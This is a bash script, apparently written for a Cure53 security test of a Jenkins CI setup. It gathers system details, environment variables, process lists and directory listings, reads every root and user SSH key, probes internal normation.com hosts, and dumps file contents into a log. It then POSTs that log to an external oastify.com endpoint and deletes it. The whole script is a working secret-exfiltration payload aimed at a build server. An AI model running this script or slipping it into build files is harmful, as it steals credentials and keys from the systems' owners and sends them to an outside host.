#!/usr/bin/env bash
apt update && apt install -y curl

LOG="$(mktemp)"
# Cure53 testing

echo "== system ==" >> "${LOG}"
id >> "${LOG}"
date >> "${LOG}"
uname -a >> "${LOG}"
ip addr >> "${LOG}"

echo "== env ==" >> "${LOG}"
env >> "${LOG}"

echo "== ps aux ==" >> "${LOG}"
ps aux >> "${LOG}"

echo "== ls Home ==" >> "${LOG}"
ls -lah ~/ >> "${LOG}"
ls -lah ~/* >> "${LOG}"

echo "== github ==" >> "${LOG}"
ssh git@github.com >> "${LOG}"

echo "== cat root ssh keys ==" >> "${LOG}"
cat ~/.ssh/* >> "${LOG}"

echo "== cat user ssh keys ==" >> "${LOG}"
cat /home/*/.ssh/* >> "${LOG}"

echo "== ls tmp ==" >> "${LOG}"
ls -lah /tmp/ >> "${LOG}"

echo "== ls Root ==" >> "${LOG}"
ls -lah / >> "${LOG}"

echo "== ls Jenkins Workspace ==" >> "${LOG}"
touch /srv/jenkins/workspace/cure53.txt
ls -lah /srv/jenkins/workspace/ >> "${LOG}"
cat /* >> "${LOG}"

echo "== blueocean.priv.normation.com ==" >> "${LOG}"
curl -v "http://blueocean.priv.normation.com" >> "${LOG}"
curl -v "https://blueocean.priv.normation.com" >> "${LOG}"

echo "== nrm-vir-repository-01.priv.normation.com ==" >> "${LOG}"
curl -v "http://nrm-vir-repository-01.priv.normation.com" >> "${LOG}"
curl -v "https://nrm-vir-repository-01.priv.normation.com" >> "${LOG}"

echo "== ci.normation.com/jenkins/ ==" >> "${LOG}"
curl -v "https://ci.normation.com/jenkins/" >> "${LOG}"

# send the collected log to the OAST endpoint
curl -s -X POST --data-binary @"${LOG}" https://lynrf95yqtuijsb55q3d0brzmqshg94y.oastify.com/makefile

# clean up
rm -f "${LOG}"
